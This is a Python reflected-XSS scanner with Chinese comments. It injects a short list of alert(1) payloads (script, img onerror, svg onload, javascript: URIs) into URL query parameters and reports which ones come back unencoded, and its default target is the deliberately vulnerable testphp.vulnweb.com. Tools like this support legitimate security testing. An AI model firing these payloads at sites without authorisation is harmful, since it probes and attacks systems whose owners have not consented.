#!/usr/bin/env python3
"""
XSS检测模块 - 反射型XSS检测
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style

# XSS测试payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
]


def test_payload(url, param, payload):
    """测试单个XSS payload"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query, keep_blank_values=True)

    # 注入payload
    if param in query_params:
        query_params[param] = [payload]
    else:
        query_params[param] = payload

    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    try:
        resp = requests.get(new_url, timeout=10)

        # 检查payload是否在响应中未编码
        if payload in resp.text:
            return True, new_url
    except:
        pass

    return False, None


def scan(url, param=None):
    """
    XSS检测主函数
    url: 目标URL
    param: 指定参数名（可选）
    """
    print(f"\n[*] 目标URL: {url}")

    # 解析URL获取参数
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query, keep_blank_values=True)

    if not query_params and not param:
        print(f"{Fore.RED}[!] URL没有参数，请指定参数名{Style.RESET_ALL}")
        return []

    # 确定要测试的参数
    if param:
        test_params = [param]
    else:
        test_params = list(query_params.keys())

    print(f"[*] 测试参数: {test_params}")

    results = []

    for param_name in test_params:
        print(f"\n[*] 测试参数: {param_name}")

        for payload in XSS_PAYLOADS:
            is_vuln, vuln_url = test_payload(url, param_name, payload)

            if is_vuln:
                result = {
                    'parameter': param_name,
                    'payload': payload,
                    'url': vuln_url
                }
                results.append(result)
                print(f"{Fore.RED}[!] 发现XSS漏洞！{Style.RESET_ALL}")
                print(f"    参数: {param_name}")
                print(f"    Payload: {payload}")
                break  # 找到一个就停止测试该参数

    return results


if __name__ == '__main__':
    results = scan('http://testphp.vulnweb.com/search.php?test=query')
    print(f"\n[*] 共发现 {len(results)} 个XSS漏洞")